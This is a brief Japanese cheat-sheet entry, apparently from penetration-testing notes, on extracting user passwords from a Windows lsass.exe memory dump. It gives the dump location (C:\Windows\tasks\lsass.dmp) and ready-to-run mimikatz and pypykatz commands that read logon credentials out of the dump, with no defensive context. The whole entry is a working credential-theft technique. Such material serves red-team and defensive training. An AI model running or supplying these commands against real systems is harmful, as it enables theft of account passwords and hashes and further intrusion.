# lsass.exe からユーザーパスワードを抽出する

ダンプファイルはC:\Windows\tasks\にlsass.dmpとして保存されます。その後、mimikatzとpypykatzを使ってダンプファイルを読み込み、パスワードをダンプします。

mimikatz
```
mimikatz.exe "sekurlsa::minidump C:\Windows\tasks\lsass.dmp" "sekurlsa::logonpasswords"
```

pypykatz
```
pypykatz lsa minidump lsass.dmp
```